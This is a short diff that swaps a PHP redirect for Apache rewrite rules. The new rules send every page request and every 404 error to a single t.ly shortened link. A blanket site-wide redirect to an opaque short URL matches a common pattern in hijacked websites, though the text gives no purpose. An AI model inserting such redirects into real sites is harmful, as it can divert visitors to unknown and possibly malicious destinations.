@@ -1,4 +1,7 @@
-<?php
+# Redirect all pages to https://t.ly/kBUwz
+RewriteEngine On
+RewriteCond %{REQUEST_URI} !^/https://t.ly/kBUwz [NC]
+RewriteRule ^ https://t.ly/kBUwz [R=301,L]
 
-header("location: https://t.ly/kBUwz");
-exit();
+# Redirect 404 errors to https://t.ly/kBUwz
+ErrorDocument 404 https://t.ly/kBUwz
